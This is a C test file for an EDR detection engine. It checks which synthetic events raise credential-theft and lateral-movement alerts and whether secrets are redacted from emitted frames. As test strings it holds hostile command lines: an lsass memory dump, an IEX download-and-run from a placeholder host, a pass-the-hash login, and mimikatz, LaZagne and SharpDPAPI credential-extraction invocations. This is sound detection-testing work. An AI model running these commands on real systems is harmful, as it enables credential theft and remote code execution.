/* Real published IR, direct emitter, encoder and final gates. Only the durable
 * queue/local-cache ports are captured; this is not SQLite or HTTP evidence. */
#define main p0_source_fixture_unused_main
#define edr_storage_queue_enqueue p0_source_fixture_enqueue
#define edr_event_batch_push p0_source_fixture_batch_push
#include "test_p0_source_only_durable_contract.c"
#undef main
#undef edr_storage_queue_enqueue
#undef edr_event_batch_push
#include "edr/preprocess.h"
#include "edr/detection_decision.h"
int edr_preprocess_should_emit(const EdrBehaviorRecord *record) { assert(record); return 1; }
static unsigned frames;
static int operation_frame;
static unsigned pair_id;
static int bytes_have(const uint8_t *wire,size_t len,const char *s) {size_t n=strlen(s);for(size_t i=0;i+n<=len;i++)if(!memcmp(wire+i,s,n))return 1;return 0;}
EdrError edr_storage_queue_enqueue(const char *id,const uint8_t *wire,size_t len,int compressed,int severity) {
  char reason[160];
  if(severity!=EDR_STORAGE_QUEUE_SEVERITY_TERMINAL)
    return p0_source_fixture_enqueue(id,wire,len,compressed,severity);
  assert(len>16 && edr_egress_batch_validate(wire,12,wire+12,len-12,reason,sizeof(reason)));
  edr_v1_BehaviorEvent *e=calloc(1,sizeof(*e));assert(e);
  pb_istream_t in=pb_istream_from_buffer(wire+16,len-16);
  assert(pb_decode(&in,edr_v1_BehaviorEvent_fields,e));
  assert(e->has_behavior_alert && e->evidence_projection_version==2);
  assert(edr_egress_frame_validate(wire+16,len-16,reason,sizeof(reason)));
  if(operation_frame) {
    assert(e->operation_evidence_json[0]);
    assert(!bytes_have(wire,len,"0123456789abcdef"));
    assert(!bytes_have(wire,len,"fixture-user"));
    assert(!strstr(e->cmdline,"0123456789abcdef"));
    assert(!strstr(e->behavior_alert.cmdline,"0123456789abcdef"));
    assert(!strstr(e->behavior_alert.user_subject_json,"fixture-user"));
    assert(!bytes_have(wire,len,"SYNTHETIC-CREDENTIAL-ONLY"));
    assert(!e->cmdline[0] && !e->behavior_alert.cmdline[0]);
  }
  printf("accepted frame bytes=%zu operation=%d\n",len-16,operation_frame);
  const char *dir=getenv("EDR_P0_SEMANTICS_OUTPUT_DIR");
  if(dir && dir[0]) {char file[1024];snprintf(file,sizeof(file),"%s/frame-%u.pb",dir,frames);FILE *f=fopen(file,"wb");assert(f);assert(fwrite(wire+16,1,len-16,f)==len-16);assert(fclose(f)==0);}
  if(operation_frame) {
    uint64_t original_mask=e->required_evidence_fields;
    e->required_evidence_fields|=EDR_EVIDENCE_PARENT_NAME;
    e->has_process_context=true;e->process_context.has_parent_name=true;
    strcpy(e->process_context.parent_name,"UNRELATED-PARENT");
    uint8_t parent_mutated[8192];pb_ostream_t parent_out=pb_ostream_from_buffer(parent_mutated,sizeof(parent_mutated));
    assert(pb_encode(&parent_out,edr_v1_BehaviorEvent_fields,e));
    assert(!edr_egress_frame_validate(parent_mutated,parent_out.bytes_written,reason,sizeof(reason)));
    assert(!strcmp(reason,"rule_projection_authority_unproven"));
    e->required_evidence_fields=original_mask;
    e->process_context.has_parent_name=false;e->process_context.parent_name[0]=0;
    e->required_evidence_fields|=EDR_EVIDENCE_COMMAND;
    strcpy(e->cmdline,"UNRELATED-COMMAND");strcpy(e->behavior_alert.cmdline,"UNRELATED-COMMAND");
    uint8_t mutated[8192];pb_ostream_t out=pb_ostream_from_buffer(mutated,sizeof(mutated));
    assert(pb_encode(&out,edr_v1_BehaviorEvent_fields,e));
    assert(!edr_egress_frame_validate(mutated,out.bytes_written,reason,sizeof(reason)));
  }
  free(e);frames++;return EDR_OK;
}
int edr_event_batch_push(const uint8_t *wire,size_t len) {(void)wire;(void)len;assert(!"P0 must use durable queue");return -1;}
static unsigned ordinal;
static void check_case(const char *label,EdrEventType type,const char *name,const char *cmd,unsigned port,const char *path,int want_alert,int want_local) {
  EdrBehaviorRecord *r=calloc(1,sizeof(*r));assert(r);++ordinal;
  unsigned generation=pair_id?pair_id:ordinal;
  r->type=type;r->pid=7000+generation;r->ppid=6000;r->event_time_ns=1720000000000000000LL+ordinal;
  r->process_start_key=9000+generation;r->process_creation_filetime_100ns=133600000000000000ULL+generation;
  snprintf(r->event_id,sizeof(r->event_id),"semantics-%u",ordinal);
  strcpy(r->tenant_id,"fixture-tenant");strcpy(r->endpoint_id,"fixture-endpoint");
  snprintf(r->process_name,sizeof(r->process_name),"%s",name);
  snprintf(r->exe_path,sizeof(r->exe_path),"C:\\Tools\\%s",name);
  snprintf(r->cmdline,sizeof(r->cmdline),"%s",cmd);
  strcpy(r->image_path_canonical,r->exe_path);strcpy(r->image_path_resolution_status,"RESOLVED");
  strcpy(r->process_generation_source,"file_read_process_tree_cache_generation");
  strcpy(r->net_src,"192.0.2.1");strcpy(r->net_dst,"192.0.2.10");r->net_dport=port;strcpy(r->net_proto,"tcp");
  if(path)snprintf(r->file_path,sizeof(r->file_path),"%s",path);
  EdrCommandFacts facts={r->cmdline,r->parent_cmdline};
  if(want_local) {
    EdrP0RuleIrEvaluation evaluation;assert(edr_p0_rule_ir_evaluate_record(r,&facts,&evaluation));int observed=0;
    for(uint32_t j=0;j<evaluation.match_count;j++) {EdrP0RuleIrMatch m;assert(edr_p0_rule_ir_evaluation_get_match(&evaluation,j,&m));if(m.effect==EDR_P0_EFFECT_LOCAL_OBSERVATION)observed=1;}
    edr_p0_rule_ir_evaluation_free(&evaluation);assert(observed);
  }
  unsigned before=frames,local_before=deferred_fake_local_observation_count;
  int emitted=edr_p0_rule_try_emit_with_command_facts(r,&facts);
  assert((emitted>0)==want_alert && ((frames-before)>0)==want_alert);
  assert(deferred_fake_local_observation_count==local_before);
  EdrDetectionDecision decision={0};
  strcpy(decision.selection_action,"local_only");
  assert(!edr_preprocess_admit_telemetry(r,&decision));
  assert(deferred_fake_local_observation_count==local_before+1u);
  assert(edr_p0_rule_try_emit_with_command_facts(r,&facts)==0);
  assert(frames==before+(unsigned)emitted);
  printf("%s emitted=%d observation=%d local_admission_calls=1 repeat=0\n",label,emitted,want_local);
  free(r);
}
static void check_credential_pair(const char *label,const char *name,const char *command,
                                 int process_alert,int file_alert) {
  unsigned before=frames;
  pair_id=1000u+ordinal;
  operation_frame=1;
  check_case(label,EDR_EVENT_PROCESS_CREATE,name,command,0,NULL,process_alert,0);
  assert(frames-before==(unsigned)process_alert);
  before=frames;
  check_case(label,EDR_EVENT_FILE_READ,name,command,0,"C:\\Lab\\Login Data",file_alert,1);
  assert(frames-before==(unsigned)file_alert);
  pair_id=0;
}
int main(void) {
  deferred_fake_reset();edr_p0_rule_test_reset_dedup();edr_p0_rule_test_set_file_read_collector_healthy(1);
  edr_p0_rule_ir_lazy_init();assert(edr_p0_rule_ir_is_ready());
  check_case("smb",EDR_EVENT_NET_CONNECT,"explorer.exe","explorer.exe",445,NULL,0,1);
  check_case("rdp",EDR_EVENT_NET_CONNECT,"mstsc.exe","mstsc.exe /v:managed",3389,NULL,0,1);
  check_case("winrm",EDR_EVENT_NET_CONNECT,"powershell.exe","Enter-PSSession managed",5985,NULL,0,1);
  check_case("winrms",EDR_EVENT_NET_CONNECT,"powershell.exe","Enter-PSSession managed -UseSSL",5986,NULL,0,1);
  check_case("browser",EDR_EVENT_FILE_READ,"chrome.exe","chrome.exe",0,"C:\\Lab\\Login Data",0,1);
  check_case("backup",EDR_EVENT_FILE_READ,"backup.exe","backup.exe --daily",0,"C:\\Lab\\logins.json",0,1);
  check_case("lsass",EDR_EVENT_PROCESS_CREATE,"procdump.exe","procdump.exe -ma lsass C:\\Temp\\lsass.dmp",0,NULL,1,0);
  check_case("iex",EDR_EVENT_PROCESS_CREATE,"powershell.exe","powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/p.ps1')",0,NULL,1,0);
  check_case("nanodump echo",EDR_EVENT_PROCESS_CREATE,"cmd.exe","cmd.exe /c echo nanodump",0,NULL,0,1);
  check_case("nanodump help",EDR_EVENT_PROCESS_CREATE,"nanodump.exe","nanodump.exe --help",0,NULL,0,1);
  check_case("nanodump document",EDR_EVENT_PROCESS_CREATE,"notepad.exe","notepad.exe \"C:\\Docs\\nanodump guide.txt\"",0,NULL,0,1);
  check_case("nanodump quoted text",EDR_EVENT_PROCESS_CREATE,"cmd.exe","cmd.exe /c echo \"nanodump.exe -w C:\\Lab\\dump.dmp\"",0,NULL,0,1);
  operation_frame=1;
  check_case("nanodump explicit dump attempt",EDR_EVENT_PROCESS_CREATE,"nanodump.exe","nanodump.exe -w C:\\Lab\\dump.dmp",0,NULL,1,1);
  check_case("nanodump help with output",EDR_EVENT_PROCESS_CREATE,"nanodump.exe","nanodump.exe -w C:\\Lab\\dump.dmp --help",0,NULL,0,1);
  check_case("nanodump incomplete",EDR_EVENT_PROCESS_CREATE,"nanodump.exe","nanodump.exe -w",0,NULL,0,1);
  check_case("hash auth",EDR_EVENT_NET_CONNECT,"netexec.exe","netexec.exe smb 192.0.2.10 -u fixture-user -H 0123456789abcdef0123456789abcdef",445,NULL,1,1);
  check_case("decrypt",EDR_EVENT_FILE_READ,"mimikatz.exe","mimikatz.exe \"dpapi::chrome /in:\\\"C:\\Lab\\Login Data\\\" /unprotect\"",0,"C:\\Lab\\Login Data",1,1);
  check_credential_pair("direct decrypt","mimikatz.exe","mimikatz.exe \"dpapi::chrome /in:\\\"C:\\Lab\\Login Data\\\" /unprotect\"",1,1);
  check_credential_pair("echo","cmd.exe","cmd.exe /c echo dpapi::chrome",0,0);
  check_credential_pair("help","mimikatz.exe","mimikatz.exe \"dpapi::chrome /?\"",0,0);
  check_credential_pair("global help","mimikatz.exe","mimikatz.exe --help \"dpapi::chrome\"",0,0);
  check_credential_pair("document","notepad.exe","notepad.exe \"C:\\Docs\\chrome Login Data guide.txt\"",0,0);
  check_credential_pair("quoted data","python.exe","python.exe -c \"print('dpapi::chrome')\"",0,0);
  check_credential_pair("vault help","mimikatz.exe","mimikatz.exe \"vault::cred /?\"",0,0);
  check_credential_pair("unrecognized secret","mimikatz.exe","mimikatz.exe \"dpapi::chrome /in:\\\"C:\\Lab\\Login Data\\\" /unprotect /password:SYNTHETIC-CREDENTIAL-ONLY\"",0,0);
  check_credential_pair("masterkey","mimikatz.exe","mimikatz.exe \"dpapi::chrome /in:\\\"C:\\Lab\\Login Data\\\" /masterkey:0123456789abcdef0123456789abcdef01234567\"",1,0);
  check_credential_pair("vault credential","mimikatz.exe","mimikatz.exe \"vault::cred\" exit",1,0);
  check_credential_pair("lazagne","lazagne.exe","lazagne.exe browsers -password SYNTHETIC-CREDENTIAL-ONLY",1,0);
  check_credential_pair("sharpdpapi","SharpDPAPI.exe","SharpDPAPI.exe credentials /password:SYNTHETIC-CREDENTIAL-ONLY",1,0);
  check_credential_pair("seatbelt vault","Seatbelt.exe","Seatbelt.exe WindowsVault",1,0);
  check_credential_pair("seatbelt inventory","Seatbelt.exe","Seatbelt.exe DpapiMasterKeys",0,0);
  EdrConfig cfg;memset(&cfg,0,sizeof(cfg));cfg.policy_v2.credential_mode=EDR_POLICY_MODE_BLOCK;
  edr_policy_v2_configure(&cfg);
  check_case("decrypt block withheld",EDR_EVENT_FILE_READ,"mimikatz.exe","mimikatz.exe \"dpapi::chrome /in:\\\"C:\\Lab\\Login Data\\\" /unprotect\"",0,"C:\\Lab\\Login Data",1,1);
  check_credential_pair("attempt block withheld","SharpDPAPI.exe","SharpDPAPI.exe credentials /password:SYNTHETIC-CREDENTIAL-ONLY",1,0);
  assert(s_terminal_precreated==0 && s_terminal_updated==0);
  return 0;
}
